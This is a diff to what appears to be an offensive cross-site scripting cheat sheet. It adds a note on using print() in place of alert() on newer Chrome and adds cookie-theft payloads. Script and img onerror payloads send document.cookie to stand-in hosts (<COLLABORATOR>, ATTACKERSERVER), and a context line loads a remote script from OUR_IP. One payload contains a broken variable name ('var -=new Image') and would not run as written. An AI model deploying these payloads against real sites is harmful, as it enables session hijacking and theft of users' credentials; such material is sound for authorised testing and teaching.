@@ -1,4 +1,4 @@
-
+**TRY to avoid alert() on Chrome 92+ as it may not work anymore. print() is good though**
 ## Reflected XSS
 
 ```JS
@@ -44,7 +44,12 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\
 
 Steal Cookie with Picture:
 ```js
-<script>var -=new Image;i.src="<COLLABORATOR>/?"+document.cookie;</script>
+<script>var -=new Image;i.src="<COLLABORATOR>/?c="+document.cookie;</script>
+```
+
+Steal cookies using img:
+```js
+<img src="x" onerror="new Image().src='http://ATTACKERSERVER/?c='+encodeURIComponent(document.cookie)+'&t='+Date.now();" />
 ```
 
 ## Stored XSS
